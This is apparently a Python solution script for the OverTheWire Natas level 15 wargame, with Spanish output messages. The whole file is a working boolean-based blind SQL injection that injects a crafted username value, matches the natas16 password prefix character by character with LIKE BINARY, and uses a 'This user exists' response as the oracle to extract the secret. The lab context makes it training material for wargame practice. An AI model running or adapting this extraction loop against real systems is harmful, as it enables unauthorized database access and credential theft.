import requests
from string import ascii_letters, digits

chars = ascii_letters + digits
url = "http://natas15.natas.labs.overthewire.org"
auth = ('natas15', '<contraseñaNatas15>')
found = ""

while True:
    for c in chars:
        payload = f'natas16" AND password LIKE BINARY "{found + c}%" -- '
        r = requests.get(url, auth=auth, params={"username": payload})
        if "This user exists" in r.text:
            found += c
            print(f"[+] Encontrada: {found}")
            break
    else:
        break
print("Contraseña:", found)
